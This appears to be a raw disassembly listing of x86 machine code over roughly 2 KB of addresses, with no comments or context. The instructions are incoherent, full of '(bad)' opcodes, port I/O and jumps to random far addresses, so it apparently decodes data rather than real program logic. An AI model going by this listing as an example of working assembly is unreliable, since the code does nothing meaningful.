  4090bf:	loop   0x4090e3
  4090c1:	push   es
  4090c2:	addr16 add al,0x89
  4090c5:	sar    BYTE PTR [esi],cl
  4090c7:	aaa    
  4090c8:	jb     0x4090b9
  4090ca:	in     eax,0xaf
  4090cc:	popa   
  4090cd:	xchg   esp,eax
  4090ce:	jns    0x409058
  4090d0:	jl     0x409094
  4090d2:	repz pusha 
  4090d4:	punpckhwd mm2,QWORD PTR [eax]
  4090d7:	test   edx,ebx
  4090d9:	inc    ecx
  4090da:	add    BYTE PTR [edx],ch
  4090dc:	sub    al,0x49
  4090de:	push   esp
  4090df:	sbb    BYTE PTR [edi+0x71],0x2d
  4090e3:	mov    dl,0xcb
  4090e5:	add    eax,0xa62d033c
  4090ea:	repz inc cl
  4090ed:	imul   DWORD PTR [eax]
  4090ef:	sub    eax,0x88fd1419
  4090f4:	dec    esi
  4090f5:	in     al,dx
  4090f6:	sbb    esp,DWORD PTR [ebx]
  4090f8:	sub    DWORD PTR [eax+eiz*1],eax
  4090fb:	push   ebx
  4090fc:	mov    eax,ds:0x46f059b4
  409101:	imul   esi,ebp,0xffffffa5
  409104:	call   0x67c312bd
  409109:	or     DWORD PTR [ecx+0x1],esi
  40910c:	pop    ecx
  40910d:	aam    0x91
  40910f:	das    
  409110:	pop    esi
  409111:	pop    ds
  409112:	lods   al,BYTE PTR ds:[esi]
  409113:	shr    esp,cl
  409115:	or     DWORD PTR [esi+0x98682f8],esp
  40911b:	jg     0x409170
  40911d:	retf   
  40911e:	jp     0x4090c7
  409120:	fdiv   DWORD PTR [esi-0x73]
  409123:	or     DWORD PTR [ebx*4+0x87dea66],ebx
  40912a:	inc    BYTE PTR [edx]
  40912c:	push   edx
  40912d:	push   0x48
  40912f:	repz push ebx
  409131:	dec    ebx
  409132:	repz sub al,0x5e
  409135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409136:	xchg   BYTE PTR [ecx-0x35],ch
  409139:	mov    ds:0x90c7a350,eax
  40913e:	fucomip st,st(3)
  409140:	dec    ecx
  409141:	cdq    
  409142:	jbe    0x40915e
  409144:	inc    ebp
  409145:	fwait
  409146:	mov    esp,0xa37a68d3
  40914b:	mov    bl,0x44
  40914d:	xchg   esi,eax
  40914e:	mov    ah,0x9b
  409150:	sub    BYTE PTR [ebp+0x931e4ce],bl
  409156:	stos   DWORD PTR es:[edi],eax
  409157:	jnp    0x40910a
  409159:	iret   
  40915a:	lea    ebp,[ebx]
  40915c:	or     BYTE PTR [eax+0x315ef9ef],al
  409162:	mov    eax,ds:0xc76c3841
  409167:	inc    edi
  409168:	dec    edi
  409169:	jb     0x409136
  40916b:	test   eax,0x191da3a3
  409170:	dec    ebp
  409171:	jg     0x4091db
  409173:	add    BYTE PTR [edi+0x1c15cd09],cl
  409179:	sub    al,0x72
  40917b:	add    esi,DWORD PTR [eax]
  40917d:	jbe    0x409117
  40917f:	pop    eax
  409180:	mov    cl,0xf4
  409182:	mov    ds,WORD PTR [ebx+0x1]
  409185:	nop
  409186:	or     DWORD PTR [ebx+ebx*1-0x24],ebx
  40918a:	cmp    al,al
  40918c:	and    al,0xfa
  40918e:	xchg   esp,eax
  40918f:	loop   0x4091e3
  409191:	in     eax,0xe8
  409193:	mov    edx,0xc800ec7c
  409198:	pop    ss
  409199:	mov    ?,WORD PTR [ecx-0x12d204b0]
  40919f:	bound  ebp,QWORD PTR [ebp+0x492b6882]
  4091a5:	mov    WORD PTR [edx],gs
  4091a7:	mov    ds:0xb6413f97,eax
  4091ac:	and    DWORD PTR [ecx],0x5a
  4091af:	pop    eax
  4091b0:	imul   ebx,DWORD PTR [edx],0xce0b138e
  4091b6:	ins    DWORD PTR es:[edi],dx
  4091b7:	push   0xffffffb9
  4091b9:	pop    ecx
  4091ba:	and    ecx,DWORD PTR cs:[esi]
  4091bd:	xchg   DWORD PTR [ebp+ebx*2+0x46],eax
  4091c1:	mov    al,BYTE PTR [ecx-0x3deb8f63]
  4091c7:	rol    BYTE PTR [edi+eax*8],0x9c
  4091cb:	cli    
  4091cc:	(bad)  
  4091cd:	xor    al,0x3b
  4091cf:	mov    edx,DWORD PTR [eax+0x49]
  4091d2:	jns    0x40921a
  4091d4:	(bad)
  4091d8:	stos   DWORD PTR es:[edi],eax
  4091d9:	mov    bh,0x99
  4091db:	dec    edx
  4091dc:	sbb    DWORD PTR [ebx-0x1e64974f],ebx
  4091e2:	or     al,0xd5
  4091e4:	repz rcl BYTE PTR [ecx+0x42a683e1],1
  4091eb:	inc    ecx
  4091ec:	into   
  4091ed:	lock xor bh,ah
  4091f0:	shl    ah,cl
  4091f2:	mov    dh,0x2e
  4091f4:	das    
  4091f5:	inc    edx
  4091f6:	adc    DWORD PTR [ebx-0x65],0x6a
  4091fa:	ins    BYTE PTR es:[edi],dx
  4091fb:	push   ds
  4091fc:	mov    esi,0x2e8c9ee3
  409201:	out    dx,eax
  409202:	enter  0x5ba3,0xd3
  409206:	shr    DWORD PTR [ecx],0x23
  409209:	enter  0x960f,0xd
  40920d:	or     ebx,DWORD PTR [eax-0x84e799b]
  409213:	mov    eax,0xe47c05a9
  409218:	push   ebp
  409219:	inc    ecx
  40921a:	mov    esi,0x7224f312
  40921f:	test   eax,0x8cdab2f3
  409224:	jg     0x4091e5
  409226:	mov    BYTE PTR [edx-0x6e],bh
  409229:	ret    0xacc2
  40922c:	ins    BYTE PTR es:[edi],dx
  40922d:	mov    esi,0xe3cab0
  409232:	inc    esp
  409233:	jmp    0xec28f3e5
  409238:	ss xchg edi,eax
  40923a:	or     esp,0xaab1f4bf
  409240:	out    0xdc,eax
  409242:	fst    QWORD PTR [eax]
  409244:	paddb  mm0,QWORD PTR [edx]
  409247:	aad    0x6f
  409249:	int    0x1f
  40924b:	or     DWORD PTR [edi],esi
  40924d:	xchg   DWORD PTR ds:0xe8f5e9b6,esp
  409254:	cmc    
  409255:	sbb    eax,0xcb599109
  40925a:	push   esi
  40925b:	stos   DWORD PTR es:[edi],eax
  40925c:	sbb    al,0x7e
  40925e:	dec    esp
  40925f:	pop    es
  409260:	cmp    edx,DWORD PTR [eax]
  409262:	and    esp,ebx
  409264:	retf   
  409265:	bound  ebx,QWORD PTR [ecx]
  409267:	xchg   ecx,eax
  409268:	int3   
  409269:	adc    al,BYTE PTR [esi]
  40926b:	sbb    edx,ecx
  40926d:	imul   ebp,DWORD PTR [ebx-0x56],0x50
  409271:	int    0x63
  409273:	inc    eax
  409274:	sti    
  409275:	sub    eax,0xefc64349
  40927a:	mov    WORD PTR [edx-0x3773cbe9],?
  409280:	data16 or ah,BYTE PTR [edx]
  409283:	jns    0x40920b
  409285:	in     eax,dx
  409286:	sbb    BYTE PTR [eax],0x8e
  409289:	js     0x40923c
  40928b:	cmp    DWORD PTR [ebx],0x88905811
  409291:	xor    DWORD PTR [eax+0x7dca543f],ebx
  409297:	aam    0x13
  409299:	rcl    BYTE PTR [edi+0x3740255c],cl
  40929f:	call   0x7095:0x95be217b
  4092a6:	jne    0x4092e5
  4092a8:	cli    
  4092a9:	mov    dh,0x73
  4092ab:	xchg   edx,eax
  4092ac:	ret    
  4092ad:	sbb    edi,0xb5555cfb
  4092b3:	test   al,0xd
  4092b5:	push   ebx
  4092b6:	mov    eax,0xa4eaf118
  4092bb:	mov    BYTE PTR [eax+0x2e],dl
  4092be:	add    al,0xf9
  4092c0:	stos   DWORD PTR es:[edi],eax
  4092c1:	test   al,0xe0
  4092c3:	xchg   edi,eax
  4092c4:	inc    edx
  4092c5:	test   BYTE PTR [edi],bl
  4092c7:	mov    ebp,0x3b1a14b
  4092cc:	stc    
  4092cd:	out    dx,eax
  4092ce:	vmwrite ebp,edi
  4092d1:	repz in al,0xc2
  4092d4:	hlt    
  4092d5:	xor    DWORD PTR [ecx-0x4554935b],ebp
  4092db:	sub    ch,ah
  4092dd:	sub    al,BYTE PTR [ecx+ebx*1-0x1f]
  4092e1:	jmp    FWORD PTR [ecx]
  4092e3:	out    0x5a,eax
  4092e5:	dec    eax
  4092e6:	mov    dl,0x55
  4092e8:	imul   ecx,DWORD PTR [edx-0x2b],0xfffffff3
  4092ec:	iret   
  4092ed:	fistp  WORD PTR [eax+0x7786e646]
  4092f3:	dec    ebp
  4092f4:	addr16 fs pop ecx
  4092f7:	leave  
  4092f8:	sbb    eax,0x4be91395
  4092fd:	xchg   ebx,eax
  4092fe:	mov    ds:0xbc1c0d9e,eax
  409303:	enter  0x94b7,0x40
  409307:	push   esi
  409308:	adc    ebp,DWORD PTR [ecx+0x3f]
  40930b:	xchg   esi,eax
  40930c:	out    0x6d,eax
  40930e:	inc    edx
  40930f:	mov    esp,0xaed0fb87
  409314:	fisttp DWORD PTR [edi+0x1b94b1f0]
  40931a:	scas   eax,DWORD PTR es:[edi]
  40931b:	sbb    eax,DWORD PTR [eax-0x70]
  40931e:	ja     0x40938b
  409320:	lock mov ds:0x44f3f932,al
  409326:	mov    esp,0x6046c024
  40932b:	cwde   
  40932c:	mov    edi,0x56598da0
  409331:	xor    BYTE PTR [edi+edx*2],ch
  409334:	mov    edx,0x51d1e864
  409339:	mov    ds:0xebcb6499,eax
  40933e:	das    
  40933f:	lods   al,BYTE PTR ds:[esi]
  409340:	push   0x5f9e0c35
  409345:	lods   eax,DWORD PTR ds:[esi]
  409346:	je     0x409353
  409348:	push   esp
  409349:	inc    ebx
  40934a:	lea    esi,ds:[ecx+0x5fe4b1e]
  409351:	fisubr DWORD PTR [ebp+0x4595b2c7]
  409357:	pop    esp
  409358:	ins    DWORD PTR es:[edi],dx
  409359:	pop    es
  40935a:	(bad)  
  40935b:	fisubr DWORD PTR [eax-0x57c12250]
  409361:	mov    ah,0x34
  409363:	adc    DWORD PTR [eax-0x5],esi
  409366:	pop    esp
  409367:	xor    esp,DWORD PTR [edx+0x7d]
  40936a:	inc    esi
  40936b:	lock inc esi
  40936d:	jle    0x40935a
  40936f:	stos   BYTE PTR es:[edi],al
  409370:	sti    
  409371:	stc    
  409372:	push   0xffffffe4
  409374:	cmp    BYTE PTR [edi+0x4e900de1],bl
  40937a:	jno    0x4093a5
  40937c:	sub    edi,DWORD PTR [bp+si+0x57]
  409380:	pop    edi
  409381:	in     eax,0x46
  409383:	cmp    al,0x8a
  409385:	push   edi
  409386:	cmp    DWORD PTR [esi+0x62],esi
  409389:	test   DWORD PTR [eax],edi
  40938b:	push   0xd0bdf50b
  409390:	cli    
  409391:	loopne 0x4093e4
  409393:	mov    dh,0x19
  409395:	aad    0x47
  409397:	scas   eax,DWORD PTR es:[edi]
  409398:	push   ss
  409399:	mov    DWORD PTR [edi+0x13],ebx
  40939c:	out    dx,al
  40939d:	in     eax,dx
  40939e:	ror    edi,cl
  4093a0:	push   esp
  4093a1:	adc    bh,BYTE PTR [ebx+0x511c54e0]
  4093a7:	xlat   BYTE PTR ds:[ebx]
  4093a8:	sub    eax,0xd7b3c394
  4093ad:	inc    edx
  4093ae:	ret    0x627a
  4093b1:	and    DWORD PTR [ecx-0x72d6399e],ecx
  4093b7:	xor    ch,dh
  4093b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093ba:	retf   
  4093bb:	pop    ds
  4093bc:	or     eax,0x254dabb1
  4093c1:	adc    dl,BYTE PTR [ecx+0x33d16ce]
  4093c7:	and    dh,BYTE PTR [ebx+0x32ca24cb]
  4093cd:	or     DWORD PTR ds:0x13095785,eax
  4093d3:	in     eax,0x97
  4093d5:	and    BYTE PTR [esi+0x67],0x53
  4093d9:	adc    DWORD PTR [edi+0x60aa13c],0xffffffab
  4093e0:	add    eax,0x79f142fd
  4093e5:	int3   
  4093e6:	jmp    0x4093bf
  4093e8:	inc    esi
  4093e9:	and    esp,DWORD PTR [edx-0x39a9de9a]
  4093ef:	ret    
  4093f0:	imul   ecx,DWORD PTR ds:0x3b5dd487,0x9fcf2b19
  4093fa:	xor    BYTE PTR [eax+edx*1],dl
  4093fd:	jmp    0x4093a4
  4093ff:	ss xchg ebp,eax
  409401:	adc    dh,bh
  409403:	mov    bh,0xc1
  409405:	out    0x1a,eax
  409407:	sub    DWORD PTR [edi],ebp
  409409:	sbb    ax,ax
  40940c:	mov    ebx,0x1c8a3924
  409411:	add    ch,BYTE PTR [ebp-0x500556b0]
  409417:	imul   ebx,DWORD PTR [edi+eiz*8],0xa0459dc3
  40941e:	rcl    DWORD PTR [edi+0x19],0x45
  409422:	js     0x40940e
  409424:	fldenv [ecx-0x7d]
  409427:	inc    esp
  409428:	leave  
  409429:	not    DWORD PTR [edi-0x23]
  40942c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40942d:	sub    al,BYTE PTR [edi+edx*8+0x7b]
  409431:	out    dx,al
  409432:	pop    ebp
  409433:	cwde   
  409434:	xchg   esi,eax
  409435:	aad    0x34
  409437:	lods   eax,DWORD PTR ds:[esi]
  409438:	mov    eax,0x76cc502c
  40943d:	mov    bh,0x56
  40943f:	and    eax,0x6f32a32c
  409444:	je     0x40945f
  409446:	out    dx,eax
  409447:	scas   eax,DWORD PTR es:[edi]
  409448:	ror    dl,0x49
  40944b:	or     al,0x10
  40944d:	adc    esi,DWORD PTR [ebp+0x6c]
  409450:	mov    ds,WORD PTR [ebx]
  409452:	mov    ch,0x10
  409454:	add    BYTE PTR ds:0x2926223a,dl
  40945a:	cmp    DWORD PTR [ecx],edx
  40945c:	or     eax,0x757974de
  409461:	(bad)
  409464:	mov    al,ds:0xd0ce3e54
  409469:	pop    ecx
  40946a:	xor    ecx,DWORD PTR [edx-0x649fc7fd]
  409470:	jae    0x4094d8
  409472:	xlat   BYTE PTR ds:[ebx]
  409473:	dec    esi
  409474:	mov    eax,ds:0x65dd2edb
  409479:	mov    dh,0xaa
  40947b:	and    eax,0xd9e8631b
  409480:	pop    es
  409481:	ins    DWORD PTR es:[edi],dx
  409482:	sub    BYTE PTR [ecx-0x46],dh
  409485:	ret    0xe89
  409488:	pop    es
  409489:	xor    edi,eax
  40948b:	cmc    
  40948c:	in     eax,0xa
  40948e:	fidiv  DWORD PTR [eax]
  409490:	add    bl,BYTE PTR [eax-0x728a69e]
  409496:	call   0x9034:0x6525c0e0
  40949d:	sbb    BYTE PTR [ebx],dh
  40949f:	jmp    0x4094f3
  4094a1:	imul   ebx,DWORD PTR [ebp+ebx*2-0xf],0xfffffffa
  4094a6:	and    DWORD PTR [ebx-0x674d14da],edx
  4094ac:	jbe    0x4094ca
  4094ae:	and    al,0x4b
  4094b0:	leave  
  4094b1:	dec    ecx
  4094b2:	out    dx,eax
  4094b3:	rol    dl,0xca
  4094b6:	int    0x13
  4094b8:	nop
  4094b9:	shl    ebx,0x78
  4094bc:	loope  0x40950a
  4094be:	push   0xe93c59de
  4094c3:	outs   dx,BYTE PTR ds:[esi]
  4094c4:	sar    dl,1
  4094c6:	mov    ?,ecx
  4094c8:	sub    DWORD PTR [esi],edx
  4094ca:	pop    DWORD PTR [ebx]
  4094cc:	(bad)  
  4094cd:	arpl   WORD PTR [eax-0x6f34e409],ax
  4094d3:	push   ss
  4094d4:	(bad)  [edi+0x46f19557]
  4094da:	xchg   edx,eax
  4094db:	and    edx,DWORD PTR [eax-0x51]
  4094de:	mov    ds:0xb3be19c0,eax
  4094e3:	les    esp,FWORD PTR [ecx+0x71]
  4094e6:	out    dx,al
  4094e7:	fsubr  QWORD PTR [ecx-0x36]
  4094ea:	dec    esp
  4094eb:	cmp    eax,DWORD PTR [ecx]
  4094ed:	or     ebp,DWORD PTR [edx-0x1fc4dfd4]
  4094f3:	xor    ebp,ecx
  4094f5:	mov    eax,ds:0x9b09c922
  4094fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094fb:	sbb    eax,DWORD PTR [ebx-0x41]
  4094fe:	mov    edx,0x1e4e964d
  409503:	sub    eax,0x315bd388
  409508:	mov    ds:0xab71540c,al
  40950d:	lock cmp ah,ch
  409510:	push   cs
  409511:	xchg   esi,eax
  409512:	call   0x8a0a:0x238e3bc8
  409519:	push   cs
  40951a:	mov    eax,ds:0xea72c11b
  40951f:	pop    es
  409520:	ins    BYTE PTR es:[edi],dx
  409521:	push   ecx
  409522:	add    cl,0xaa
  409525:	push   esp
  409526:	adc    ebp,DWORD PTR [edx+0x69]
  409529:	in     al,dx
  40952a:	fimul  DWORD PTR es:[esp+ebp*2-0x7ebc7b16]
  409532:	std    
  409533:	pop    ds
  409534:	adc    al,0x4f
  409536:	fdivr  DWORD PTR [edi]
  409538:	sbb    al,0xc4
  40953a:	inc    esi
  40953b:	dec    eax
  40953c:	ror    cl,0x76
  40953f:	js     0x40951f
  409541:	push   eax
  409542:	arpl   WORD PTR [edx-0x241b906],cx
  409548:	out    dx,eax
  409549:	pushf  
  40954a:	call   0x421d:0xaf0eb236
  409551:	xlat   BYTE PTR ds:[ebx]
  409552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409553:	in     al,0xd0
  409555:	lea    edx,[ebp+0x6f]
  409558:	and    al,0x74
  40955a:	lds    eax,FWORD PTR [edi+0x62]
  40955d:	push   edi
  40955e:	adc    DWORD PTR [edx-0x1c],ebp
  409561:	hlt    
  409562:	mov    dh,0x59
  409564:	cmc    
  409565:	and    esi,DWORD PTR [ecx]
  409567:	call   0xe68ee3fe
  40956c:	mov    edi,0x85fbb3ae
  409571:	push   es
  409572:	xchg   ebp,eax
  409573:	xor    al,0x78
  409575:	add    BYTE PTR [ecx-0x1e1f780],0x6f
  40957c:	cmp    DWORD PTR [edi-0x23527c9d],edx
  409582:	out    0xd2,al
  409584:	add    edx,esi
  409586:	mov    edx,0xc768a876
  40958b:	or     dh,cl
  40958d:	ficomp DWORD PTR [esi-0x3e]
  409590:	sbb    edi,ecx
  409592:	push   ds
  409593:	inc    esi
  409594:	adc    DWORD PTR [edx+ebx*1-0x55],esi
  409598:	shl    BYTE PTR [eax+ecx*2-0x1e919211],1
  40959f:	push   0xffffffe6
  4095a1:	imul   ecx,DWORD PTR [esi],0x5193383d
  4095a7:	imul   esi,DWORD PTR [ecx-0x7146d7a9],0x205680e0
  4095b1:	sub    eax,0xf8d49076
  4095b6:	mov    ds:0x45d009f2,eax
  4095bb:	xchg   ecx,eax
  4095bc:	fxch   st(7)
  4095be:	or     ah,BYTE PTR [ebx]
  4095c0:	jecxz  0x40955e
  4095c2:	ds nop
  4095c4:	fcmovb st,st(2)
  4095c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095c7:	cwde   
  4095c8:	sub    DWORD PTR [ebx],0x7
  4095cb:	aaa    
  4095cc:	adc    ch,BYTE PTR [esi-0x3ba23bb9]
  4095d2:	aaa    
  4095d3:	pop    ss
  4095d4:	hlt    
  4095d5:	xchg   esp,eax
  4095d6:	scas   eax,DWORD PTR es:[edi]
  4095d7:	stos   DWORD PTR es:[edi],eax
  4095d8:	jp     0x40957a
  4095da:	push   cs
  4095db:	stos   BYTE PTR es:[edi],al
  4095dc:	fistp  WORD PTR [esi+0x11]
  4095df:	cmp    al,0xe7
  4095e1:	cld    
  4095e2:	sub    bh,dl
  4095e4:	push   eax
  4095e5:	addr16 dec ecx
  4095e7:	sbb    DWORD PTR [bx+di+0x59a5],edx
  4095ec:	nop
  4095ed:	(bad)  
  4095ee:	out    0x77,eax
  4095f0:	ret    
  4095f1:	mov    cl,0x51
  4095f3:	mov    esi,0x7715bab5
  4095f8:	mov    eax,DWORD PTR [eax-0x1a17f523]
  4095fe:	or     edi,DWORD PTR [edi-0x5b29c49e]
  409604:	(bad)  
  409605:	aad    0xfa
  409607:	popa   
  409608:	cmp    BYTE PTR [edx],dh
  40960a:	or     cl,bl
  40960c:	xchg   esi,eax
  40960d:	outs   dx,BYTE PTR ds:[esi]
  40960e:	mov    ecx,DWORD PTR [edi]
  409610:	mov    bh,0x22
  409612:	cmp    DWORD PTR [ebp-0x56],esi
  409615:	jnp    0x4095c9
  409617:	sub    al,0x16
  409619:	stos   DWORD PTR es:[edi],eax
  40961a:	mov    ds:0x7137d060,al
  40961f:	mov    ss,edx
  409621:	in     eax,dx
  409622:	fsubr  st(2),st
  409624:	pop    edi
  409625:	(bad)  
  409626:	out    0xf8,al
  409628:	enter  0xe63d,0x84
  40962c:	fistp  DWORD PTR [ebp-0x6f]
  40962f:	cmp    dh,ch
  409631:	data16 and ch,BYTE PTR [esi-0x8]
  409635:	enter  0x1547,0x47
  409639:	fstp   TBYTE PTR [ebx-0x6c5fa483]
  40963f:	xor    dh,BYTE PTR ds:0x4f8630bd
  409645:	clc    
  409646:	into   
  409647:	je     0x40961a
  409649:	scas   al,BYTE PTR es:[edi]
  40964a:	stc    
  40964b:	sar    BYTE PTR [eax],cl
  40964d:	jne    0x4096a8
  40964f:	or     BYTE PTR [ecx-0x80],ah
  409652:	js     0x4096ac
  409654:	in     eax,dx
  409655:	xor    eax,0xe7af8c4
  40965a:	jae    0x409642
  40965c:	push   es
  40965d:	lea    ebx,[bx]
  409660:	pop    ss
  409661:	repnz stos DWORD PTR es:[edi],eax
  409663:	shl    BYTE PTR [edx],1
  409665:	std    
  409666:	fidiv  DWORD PTR [esi]
  409668:	push   ebp
  409669:	test   al,0xbf
  40966b:	sbb    DWORD PTR [eax+0x0],ecx
  40966e:	pop    esp
  40966f:	cld    
  409670:	sub    al,0xd5
  409672:	push   eax
  409673:	cwde   
  409674:	mov    edx,0x50012c15
  409679:	mov    bh,0xfb
  40967b:	cmp    BYTE PTR [edi-0x210350c7],bl
  409681:	mov    al,ds:0x98afb87e
  409686:	push   cs
  409687:	mov    edx,0xae2d7f49
  40968c:	popa   
  40968d:	jo     0x4096cf
  40968f:	mov    BYTE PTR [eax-0x1d],al
  409692:	int3   
  409693:	mov    bl,0xa6
  409695:	push   ebp
  409696:	sti    
  409697:	mov    eax,ds:0x9c6d9fdf
  40969c:	(bad)  
  40969e:	lahf   
  40969f:	xor    eax,0xda6665ef
  4096a4:	dec    eax
  4096a5:	mov    edi,0x999eae5
  4096aa:	(bad)  
  4096ab:	jl     0x40971a
  4096ad:	xor    al,0x37
  4096af:	lock mov esi,0x2c5669c5
  4096b5:	repnz mov dl,0xd2
  4096b8:	scas   al,BYTE PTR es:[edi]
  4096b9:	fldenv [eax-0x10]
  4096bc:	pop    edi
  4096bd:	pop    edi
  4096be:	cmp    esi,eax
  4096c0:	dec    edx
  4096c1:	ds jnp 0x40972b
  4096c4:	push   eax
  4096c5:	or     bl,BYTE PTR [ebx+0x37d35c53]
  4096cb:	loop   0x4096eb
  4096cd:	mov    DWORD PTR [eax],ecx
  4096cf:	call   FWORD PTR [ebp*1+0x1f92a9f8]
  4096d6:	pop    esi
  4096d7:	mov    ds:0xb79951db,eax
  4096dc:	dec    esp
  4096dd:	and    DWORD PTR [ebx+0x4c73d282],esp
  4096e3:	mov    ch,0xeb
  4096e5:	inc    edi
  4096e6:	jge    0x4096d3
  4096e8:	inc    esi
  4096e9:	je     0x4096d4
  4096eb:	inc    ebx
  4096ec:	lods   eax,DWORD PTR ds:[esi]
  4096ed:	cld    
  4096ee:	inc    edx
  4096ef:	or     DWORD PTR [edi-0x5c],0x85ca5f69
  4096f6:	pusha  
  4096f7:	push   ebx
  4096f8:	js     0x409697
  4096fa:	jmp    0x4641f740
  4096ff:	repnz daa 
  409701:	mov    al,ds:0x2b8e362f
  409706:	pop    ss
  409707:	mov    edx,0xcfaece5a
  40970c:	inc    ecx
  40970d:	fisub  DWORD PTR [ebp+0xc]
  409710:	frstor [edi-0x74]
  409713:	xor    ah,BYTE PTR [ebx+0x18565838]
  409719:	arpl   WORD PTR [edi+0x3d70c188],bp
  40971f:	jnp    0x409756
  409721:	out    0x19,eax
  409723:	rcr    DWORD PTR [edi-0x261a770f],0x4c
  40972a:	add    edx,DWORD PTR [ecx-0x828f422]
  409730:	dec    ecx
  409731:	sub    BYTE PTR [edx],bh
  409733:	jbe    0x4097a9
  409735:	in     al,dx
  409736:	cmc    
  409737:	mov    bh,0xee
  409739:	retf   
  40973a:	pushf  
  40973b:	cmp    edi,DWORD PTR [ebx+0x4b4e0762]
  409741:	and    ebx,DWORD PTR ss:[ecx+0x5d4b3f04]
  409748:	push   cs
  409749:	jae    0x4097c6
  40974b:	pop    es
  40974c:	jecxz  0x40979e
  40974e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40974f:	or     eax,0xb57f04fc
  409754:	mov    esi,esi
  409756:	push   es
  409757:	mov    al,0x5e
  409759:	popf   
  40975a:	scas   eax,DWORD PTR es:[edi]
  40975b:	les    eax,FWORD PTR [ebx-0x7]
  40975e:	in     eax,dx
  40975f:	jnp    0x4097aa
  409761:	sub    BYTE PTR [eax+0x50],bl
  409764:	arpl   WORD PTR [edx+0x1b28f150],bp
  40976a:	mov    bh,0xe8
  40976c:	pop    esi
  40976d:	aaa    
  40976e:	sti    
  40976f:	loope  0x40977c
  409771:	cli    
  409772:	gs sahf 
  409774:	hlt    
  409775:	sbb    eax,0xf58eecbd
  40977a:	xchg   ebx,eax
  40977b:	mov    esi,0x33cf95c1
  409780:	add    eax,0xf6771db5
  409785:	std    
  409786:	sar    BYTE PTR ds:0x9a4c2d4f,1
  40978c:	or     al,0x8a
  40978e:	sbb    eax,0x25944125
  409793:	outs   dx,DWORD PTR ds:[esi]
  409794:	or     eax,0xe31a9ed4
  409799:	sbb    DWORD PTR [ebx-0x60],esp
  40979c:	pusha  
  40979d:	dec    ecx
  40979e:	ins    BYTE PTR es:[edi],dx
  40979f:	mov    ss,WORD PTR ds:0x1321c2d1
  4097a5:	sahf   
  4097a6:	daa    
  4097a7:	mov    ah,0x17
  4097a9:	xlat   BYTE PTR ds:[ebx]
  4097aa:	pop    ebp
  4097ab:	icebp  
  4097ac:	repnz or ecx,DWORD PTR [edi-0x3e33e580]
  4097b3:	pop    edi
  4097b4:	test   DWORD PTR [ecx+0x5713c582],edi
  4097ba:	inc    edx
  4097bb:	pusha  
  4097bc:	cmp    DWORD PTR [bp+si-0x6563],ebx
  4097c1:	test   DWORD PTR [ecx-0x4192aecb],ebx
  4097c7:	adc    al,0x2c
  4097c9:	xor    eax,0x9cca1098
  4097ce:	jb     0x4097be
  4097d0:	cwde   
  4097d1:	lahf   
  4097d2:	aaa    
  4097d3:	mov    ch,al
  4097d5:	sub    dh,BYTE PTR [ecx+0x4a268179]
  4097db:	xchg   esp,eax
  4097dc:	mov    ds:0xb963e76c,eax
  4097e1:	mov    edi,0x7de1740f
  4097e6:	or     al,0xbb
  4097e8:	jge    0x4097fe
  4097ea:	xor    BYTE PTR [ebp+0xa4ad366],ah
  4097f0:	push   esp
  4097f1:	sbb    dh,dl
  4097f3:	push   ecx
  4097f4:	dec    edx
  4097f5:	enter  0xaef7,0x54
  4097f9:	sub    DWORD PTR [edx+0x47e1d4e],ecx
  4097ff:	and    BYTE PTR [edi-0x4e],dh
  409802:	xor    al,0x52
  409804:	lahf   
  409805:	les    esp,FWORD PTR [ecx-0x6b2b4943]
  40980b:	mov    dh,0x60
  40980d:	sbb    DWORD PTR [eax-0xaaffc95],edi
  409813:	ja     0x409876
  409815:	adc    BYTE PTR [eax+0x3ea20267],al
  40981b:	lock mov edx,0x958c8bba
  409821:	cvtps2pd xmm0,QWORD PTR [ebp+0xdc0a1e2]
  409828:	and    eax,0x16d099a6
  40982d:	inc    ecx
  40982e:	dec    eax
  40982f:	stc    
  409830:	imul   ebx,DWORD PTR [ebp+0x5cf12141],0x37
  409837:	leave  
  409838:	aam    0x1e
  40983a:	mov    edx,0x58595fcf
  40983f:	mov    al,ds:0x1f799135
  409844:	outs   dx,DWORD PTR ds:[esi]
  409845:	(bad)  
  409846:	scas   eax,DWORD PTR es:[edi]
  409847:	repnz xor eax,0xca44100d
  40984d:	dec    edi
  40984e:	in     eax,dx
  40984f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409850:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409851:	push   ebx
  409852:	jge    0x409819
  409854:	clc    
  409855:	gs ret 
  409857:	hlt    
  409858:	dec    ecx
  409859:	je     0x40986e
  40985b:	or     esp,DWORD PTR [edi]
  40985d:	sbb    al,0xca
  40985f:	popa   
  409860:	or     BYTE PTR [ecx+0x36d633af],0x8c
  409867:	jnp    0x409819
  409869:	cld    
  40986a:	jmp    0x56fd:0x237e3bb1
  409871:	xchg   edi,eax
  409872:	add    eax,0xdffe6a08
  409877:	pop    ebp
  409878:	in     eax,0xba
  40987a:	pop    es
  40987b:	(bad)  
  40987c:	jmp    0x628fc482
  409881:	push   esi
  409882:	test   DWORD PTR [ecx-0x80],ebp
  409885:	cdq    
  409886:	adc    al,0xba
  409888:	rcl    BYTE PTR [ebx-0x8],1
  40988b:	lea    esp,[eax+0xe8f4fba]
  409891:	or     edx,DWORD PTR [eax-0xb51984b]
  409897:	or     BYTE PTR [ebx-0x47],ah
  40989a:	fs clc 
  40989c:	cmp    ah,bh
  40989e:	rol    DWORD PTR [ebx],1
  4098a0:	outs   dx,BYTE PTR ds:[esi]
  4098a1:	in     eax,0xf4
  4098a3:	mov    dh,0xe6
  4098a5:	rcr    BYTE PTR [ebp+edx*4+0x2c],cl
  4098a9:	xor    BYTE PTR [edi-0x32],ch
  4098ac:	test   DWORD PTR ds:0x24a45265,0xf254376f
  4098b6:	out    0x14,al
  4098b8:	je     0x4098dd
  4098ba:	add    eax,0xc16ddb2
  4098bf:	loop   0x4098c0
  4098c1:	or     DWORD PTR [esp+eax*1+0x43bd68c2],edi
  4098c8:	in     al,0xe0
  4098ca:	rcl    BYTE PTR [edx+0x5399e709],0x71
  4098d1:	cld    
  4098d2:	lods   eax,DWORD PTR ds:[esi]
  4098d3:	test   al,0xa0
  4098d5:	sub    bh,BYTE PTR [ecx+0x283c25c4]
  4098db:	std    
